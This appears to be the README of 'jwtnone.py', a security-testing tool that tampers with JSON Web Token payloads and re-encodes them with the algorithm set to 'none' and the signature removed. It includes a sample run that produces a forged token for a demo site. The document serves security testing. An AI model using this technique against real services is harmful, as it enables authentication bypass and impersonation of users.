# jwtnone.py
Tamper with JWT tokens and re-encode them with alg=none

JWT tokens are usually signed, but some JWT implementations will accept tokens with the alg parameter set to "none". When this is the case, the signature can be omitted and the token can be tampered with. 

jwtnone.py takes a jwt token, tampers with the contents, and returns a new token with alg set to none and the signature omitted. 


    $ python jwtnone.py
    usage: jwtnone.py [-h] [-t] token
    jwtnone.py: error: too few arguments
    $ python jwtnone.py -t eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTU2NjQwMjUxOCwiZXhwIjoxNTY2NDAyNjM4LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.dP2xVOVMTLnRt2mZ1oUWK7vGSWS0czkeFJrvXTcDySk
    Current algorithm:  HS256
    Payload contents:  {"iss":"http:\/\/demo.sjoerdlangkemper.nl\/","iat":1566402518,"exp":1566402638,"data":{"hello":"world"}}
    -
    Tamper with payload contents:
      iss [ http://demo.sjoerdlangkemper.nl/ ] 
      iat [ 1566402518 ] 
      hello [ world ] 
      exp [ 1566402638 ] 
    New token:  eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpc3MiOiAiaHR0cDovL2RlbW8uc2pvZXJkbGFuZ2tlbXBlci5ubC8iLCAiaWF0IjogMTU2NjQwMjUxOCwgImRhdGEiOiB7ImhlbGxvIjogIndvcmxkIn0sICJleHAiOiAxNTY2NDAyNjM4fQ.


